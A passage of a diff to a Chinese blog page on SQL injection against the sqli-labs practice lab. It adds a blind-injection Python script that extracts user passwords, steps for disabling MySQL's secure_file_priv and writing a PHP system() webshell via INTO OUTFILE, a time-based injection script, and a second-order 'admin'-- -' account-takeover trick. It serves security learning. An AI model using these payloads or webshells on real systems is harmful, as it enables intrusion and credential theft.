@@ -30,8 +30,14 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgf12.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%BE%E5%88%B0api%E7%9A%84%E7%BD%91%E5%9D%80.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%9B%B2%E6%B3%A8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpstudy%E8%AE%BE%E7%BD%AE.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%BE%E5%88%B0mysql%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9B%B4%E6%94%B9mysql%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%80%9A%E8%BF%87get%E4%BC%A0%E5%8F%82%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5.png">
 <meta property="article:published_time" content="2023-12-21T06:44:12.000Z">
-<meta property="article:modified_time" content="2023-12-21T12:18:20.408Z">
+<meta property="article:modified_time" content="2023-12-23T10:12:51.687Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary_large_image">
@@ -228,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          2.9k 字
         
       </span>
     
@@ -239,7 +245,7 @@
         
         
         
-          9 分钟
+          25 分钟
         
       </span>
     
@@ -306,7 +312,33 @@
 <p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%BE%E5%88%B0api%E7%9A%84%E7%BD%91%E5%9D%80.png" srcset="/img/loading.gif" lazyload alt="找到api的网址"></p>
 <p>将其复制到postman中的url中就可以点击send发送请求。</p>
 <hr>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>判断注入点，编写脚本进行盲注。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%9B%B2%E6%B3%A8.png" srcset="/img/loading.gif" lazyload alt="盲注"></p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gml">import requests<br>import time<br>session = requests.session()<br>url = <span class="hljs-string">&quot;http://192.168.2.128/sqli/Less-8/?id=1&#x27;&quot;</span><br><br><br><br>def db():<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">begin</span> =<span class="hljs-number">32</span><br>        <span class="hljs-keyword">end</span> =<span class="hljs-number">128</span><br>        tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">begin</span> &lt; <span class="hljs-keyword">end</span> :<br>            paramsGet = url+ <span class="hljs-string">&quot;/**/and/**/ascii(substr((select group_concat(password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.format(i,tmp)<br>            <br>            response = session.get(paramsGet)<br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span> in response.text:<br>                <span class="hljs-keyword">begin</span> = tmp + <span class="hljs-number">1</span><br>                tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">end</span> = tmp<br>                tmp = (<span class="hljs-keyword">begin</span>+<span class="hljs-keyword">end</span>)<span class="hljs-comment">//2</span><br>        <span class="hljs-keyword">if</span>(tmp==<span class="hljs-number">32</span>):<br>            <span class="hljs-keyword">break</span><br>        name += <span class="hljs-built_in">chr</span>(tmp)<br>        print(name)<br>db()<br></code></pre></td></tr></table></figure>
+
+<p>这是盲注脚本使用二分法判断字符串的编码并输出，可以自行更改substr()函数中的第一项以输出不同的值。</p>
+<h2 id="住入webshell"><a href="#住入webshell" class="headerlink" title="住入webshell"></a>住入webshell</h2><p>在关卡1中使用<code>union select 1,@@datadir,@@secure_file_priv</code>查看文件的路径和mysql的安全权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90.png" srcset="/img/loading.gif" lazyload alt="查看安全权限"></p>
+<p>如果在your password：后面没有显示NULL则表示没有安全防护，可以更改文件，若有NULL则需要更改MySQL的配置文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpstudy%E8%AE%BE%E7%BD%AE.png" srcset="/img/loading.gif" lazyload alt="phpstudy设置"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%89%BE%E5%88%B0mysql%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" lazyload alt="找到mysql的配置文件"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9B%B4%E6%94%B9mysql%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" lazyload alt="更改mysql的配置文件"></p>
+<p>在图示位置添加语句<code>secure_file_priv=&quot;&quot;</code>将安全文件设置为空。</p>
+<p>在添加过后需要再重启MySQL服务才能生效。</p>
+<p>使用语句<code>select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;C:\\phpstudy_pro\\WWW\\phpinfo.php&quot;</code>在对应路径下添加一个phpinfo.php的文件并使其添加一个通过传递get请求查看系统数据的后门。这个后门称为webshell。</p>
+<p>作用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E9%80%9A%E8%BF%87get%E4%BC%A0%E5%8F%82%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5.png" srcset="/img/loading.gif" lazyload alt="通过get传参进行注入"></p>
+<p>可以在这个页面中传入get参数以使用system()函数查看内容。</p>
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>通过判断网页的响应时间进行注入。可以使用sqlmap强行注入。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># ?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span><br><span class="hljs-string">import requests</span><br><span class="hljs-string">import time</span><br><span class="hljs-string">tr=&#x27;</span>usernam<span class="hljs-string">e&#x27;</span><br><span class="hljs-string">name=&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">url1=&quot;http://192.168.2.70/sqli/Less-9/?id=1&#x27;</span>&quot;<br>for j in range(1,10):<br>    for i in range(65,123):<br>        url=url1+&quot;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>( ascii(substring(<span class="hljs-keyword">database</span>(),&quot;+str(j)+&quot;,<span class="hljs-number">1</span>))= &quot;+str(i)+&quot;,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">-- -&quot;</span><br>        start_time = <span class="hljs-type">time</span>.time()<br>        response = requests.<span class="hljs-keyword">get</span>(url)<br>        end_time = <span class="hljs-type">time</span>.time()<br>        elapsed_time = end_time - start_time<br>        <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">3</span>:  # 如果响应时间超过<span class="hljs-number">5</span>秒<br>            <span class="hljs-type">name</span>=<span class="hljs-type">name</span>+chr(i)<br>            print(<span class="hljs-type">name</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p>
+<p>在注册账号时注册用户名为<code>admin&#39;-- -</code>，但是在登录用户<code>admin&#39;-- -</code>时会将后方语句全部注释导致登录<code>admin</code>账户，也可以利用用户<code>admin&#39;-- -</code>来修改<code>admin</code>账户的密码。</p>
+
                 
               </div>
             
